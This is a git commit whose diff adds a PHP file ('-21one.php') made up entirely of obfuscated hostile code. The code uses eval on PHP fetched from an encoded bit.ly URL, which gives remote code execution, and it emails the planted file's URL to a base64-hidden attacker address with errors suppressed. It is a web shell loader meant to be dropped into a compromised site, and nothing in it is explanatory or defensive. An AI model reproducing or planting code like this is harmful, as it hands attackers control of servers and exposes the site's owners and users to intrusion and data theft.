77b26fefdcc5582b0fd4bc5dcaf4c0befbbfbbab
gantengers <76028485+exploit-haxor@users.noreply.github.com>
2024-12-14 20:01:10 +0700

    Update and rename jemboet.php to -21one.php

---
+++ -21one.php
@@ -0,0 +1,5 @@
+<?=null;@eval("?>".file_get_contents(urldecode("h\x74t\x70\x73\x25\x33\x41\x25\x32F%2F\x62it.ly\x25\x32\x463D\x63\x4d\x6d9\x33")));
+/////DEPRESION///
+$勩搞銐櫦埢剚技併墎晥 = base64_decode("cm9vdGN5YmVycHVua3NAZ21haWwuY29t");$裤亾仌瘑笺倐曘劗銈瞾 ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "combo";mail($勩搞銐櫦埢剚技併墎晥,"for 4u", $裤亾仌瘑笺倐曘劗銈瞾);mail($勩搞銐櫦埢剚技併墎晥,"for 4u", $裤亾仌瘑笺倐曘劗銈瞾);${"\x47L\x4f\x42\x41\x4c\x53"}["\x6ei\x75\x65\x76ao\x72f\x77"]="\x6c\x6f\x76\x65";$倎紝笓唩剚劶垔勩亖沣="\x66\x6f\x72";mail(${$倎紝笓唩剚劶垔勩亖沣},"f\x6f\x72\x20\x34\x75",${${"G\x4c\x4fB\x41\x4c\x53"}["n\x69\x75\x65v\x61o\x72\x66\x77"]});@mail(${$倎紝笓唩剚劶垔勩亖沣},"f\x6f\x72\x20\x34\x75",${${"G\x4c\x4fB\x41\x4c\x53"}["n\x69\x75\x65v\x61o\x72\x66\x77"]});error_reporting(0);
+
+?>
